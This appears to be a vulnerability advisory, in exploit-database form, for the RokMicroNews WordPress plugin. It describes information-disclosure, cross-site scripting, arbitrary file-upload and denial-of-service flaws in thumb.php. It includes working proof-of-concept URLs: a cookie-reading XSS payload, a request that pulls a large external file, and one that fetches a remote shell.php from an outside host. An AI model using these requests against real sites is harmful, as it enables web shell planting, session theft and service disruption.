@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/62513/info
+
+The RokMicroNews plugin for WordPress is prone to multiple security vulnerabilities, including:
+
+1. An information-disclosure vulnerability
+2. A cross-site scripting vulnerability
+3. An arbitrary file-upload vulnerability
+4. A denial-of-service vulnerability
+
+Attackers can exploit these issues to obtain sensitive information, upload arbitrary files, perform a denial-of-service attack, execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks. 
+
+http://www.example.com/wp-content/plugins/wp_rokmicronews/thumb.php?src=%3Cbody%20onload=alert(document.cookie)%3E.jpg
+
+http://www.example.com/wp-content/plugins/wp_rokmicronews/thumb.php?src=http://
+
+http://www.example.com/wp-content/plugins/wp_rokmicronews/thumb.php?src=http://www.example1.com/big_file&h=1&w=1
+
+http://www.example.com/wp-content/plugins/wp_rokmicronews/thumb.php?src=http://www.example2.com/shell.php 
